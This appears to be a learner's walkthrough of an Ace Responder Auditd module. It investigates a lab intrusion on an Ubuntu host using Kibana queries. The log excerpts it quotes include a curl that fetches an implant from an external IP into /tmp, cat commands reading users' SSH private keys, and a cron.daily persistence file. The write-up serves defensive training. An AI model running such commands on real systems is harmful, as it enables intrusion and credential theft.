https://aceresponder.com/learn/auditd

This is a learning module for Auditd by the excellent platform Ace Responder.

**Q1. Beacon: The attacker downloaded a beacon from their C2 server. What IP address did they download the beacon from?**

I used the following query and added the columns `process.title` and `user.audit.name`:

`event.category: process AND process.args: *`

| Time                        | process.title                                              |
| --------------------------- | ---------------------------------------------------------- |
| Dec 12, 2023 @ 12:14:48.794 | curl http://54.164.150.221/implant -o /tmp/install-utility |

Upon additional review, I could have also used better fields, such as `event.action: executed`, `auditd.data.syscall: execve`, and `process.name: (curl OR wget OR scp OR ftp)`

**Q2. Initial Access: What IP did the attacker initially access Ubuntu from?**

After reviewing `event.category: authentication AND user.audit.name: ace`, there are events with the fields `source.ip`, `auditd.summary.object.secondary`, and `auditd.data.hostname` that contain the attacker's IP (in this case, the `auditd.message_type` is 'user_login').

**Q3. Private Keys: From which user other than ace did the attacker steal an SSH private key from?**

` @timestamp:[2023-12-12T12:14:48.795Z TO *] AND user.audit.name: ace`

| Time                     | process.title                              |
|--------------------------|--------------------------------------------|
| Dec 12, 2023 @ 12:25:56.451 | cat /home/myuser/.ssh/                    |
| Dec 12, 2023 @ 12:25:56.451 | cat /home/myuser/.ssh/id_rsa              |
| Dec 12, 2023 @ 12:25:56.447 | cat /home/ace/.ssh/authorized_keys        |
| Dec 12, 2023 @ 12:25:56.447 | find /home/myuser/.ssh/ -not -iname *.pub |
| Dec 12, 2023 @ 12:25:56.443 | cat /home/ace/.ssh/id_rsa                 |
| Dec 12, 2023 @ 12:25:56.439 | find /home/ace/.ssh/ -not -iname *.pub    |

The advised solution was: `user.audit.name:ace AND process.args:*.ssh*` and adding the column `process.args`.

I also made a note of the `process.pid` and `process.ppid` to timeline the attacker's actions.

**Q4. Credential Access: Which file did the attacker steal user hashes from?**

Knowing that modern systems commonly store password hashes at '/etc/shadow', I checked this first. My next stops would have been '/etc/passwd' for legacy systems, '/var/lib/sss/db/' for systems that may be using the System Security Services Daemon (SSSD) for centralised auth (LDAP, Kerberos), '/etc/security/opasswd' for hashes of previous passwords (this file stores them to prevent reuse), the LDAP directory service database (the path can vary), or '/etc/pam.d' for some Pluggable Authentication Modules (PAM) configurations that may redirect hashes/auth methods to custom files, and if third-party IAM tools like Okta are in use they may cache/store hashes locally somewhere.

**Q5. Persistence: What file did the attacker modify for persistence?**

 I have limited familiarity with Linux persistence methods and reviewed Pepe Berba's excellent article about it to learn more: https://pberba.github.io/security/2021/11/22/linux-threat-hunting-for-persistence-sysmon-auditd-webshell The chart is especially handy.

Anyway, I reused the same query earlier with a minor addition, and added the columns `auditd.summary.object.primary` and `process.title`:

`@timestamp:[2023-12-12T12:14:48.795Z TO *] AND user.audit.name: ace AND event.category: process`

There were a lot of hits here (154!) and required some manual review.

This row in particular jumped out at me:

| Time                        | auditd.summary.object.primary | process.title                    |
| --------------------------- | ----------------------------- | -------------------------------- |
| Dec 12, 2023 @ 12:28:45.059 | /usr/bin/chmod                | chmod +x /etc/cron.daily/install |

Unfortunately, its not clear to me how the binary ended up in this directory or what is actually contained in it, but it does appear to be the answer to the question. After submitting the answer, the explanation didn't help resolve my confusion, but did explain a better way to approach this problem -- using the parent PID for the script to pivot: `process.ppid:25448 OR process.ppid:25393`

**Q6. File System Event: Did the attacker create /etc/cron.daily/install or just modify it?**

```
@timestamp:[2023-12-12T12:14:48.795Z TO *] AND user.audit.name: ace AND event.category: file AND auditd.summary.object.primary: "/etc/cron.daily/install"
```

| Time                        | auditd.summary.object.primary | process.title                    | event.action                |
| --------------------------- | ----------------------------- | -------------------------------- | --------------------------- |
| Dec 12, 2023 @ 12:28:45.059 | /etc/cron.daily/install       | /bin/bash                        | opened-file                 |
| Dec 12, 2023 @ 12:28:45.059 | /etc/cron.daily/install       | chmod +x /etc/cron.daily/install | changed-file-permissions-of |

Digging into the first event, `auditd.path` reveals:

```
{
  "rdev": "00:00",
  "name": "/etc/cron.daily/",
  "cap_fe": "0",
  "cap_fi": "0",
  "dev": "08:01",
  "mode": "040755",
  "ouid": "0",
  "item": "0",
  "nametype": "PARENT",
  "ogid": "0",
  "cap_fp": "0",
  "cap_frootid": "0",
  "cap_fver": "0",
  "inode": "164"
},
{
  "cap_fver": "0",
  "inode": "2074",
  "item": "1",
  "rdev": "00:00",
  "cap_fe": "0",
  "cap_fi": "0",
  "cap_fp": "0",
  "dev": "08:01",
  "ogid": "0",
  "mode": "0100644",
  "nametype": "CREATE",
  "cap_frootid": "0",
  "name": "/etc/cron.daily/install",
  "ouid": "0"
}
```

The answer seems straightforward: "nametype:": "CREATE" indicates the path ("name": "/etc/cron.daily/install") represents a file being created.

**Q7. Beacon Frequency: Which of the following best describes the attacker's beacon interval (the amount of time that passes between check-ins)?**

I used the following query, which provided 62 hits for me to review the intervals between check-in:
```
@timestamp:[2023-12-12T12:14:48.795Z TO *] AND user.audit.name: ace AND event.category: process AND process.title: "/tmp/install-utility"
```
I submitted the answer for between 1-2 minutes, which was correct. However, the explanation showed that I had incorrectly approached the problem: I should have used `auditd.data.syscall:socket` instead.
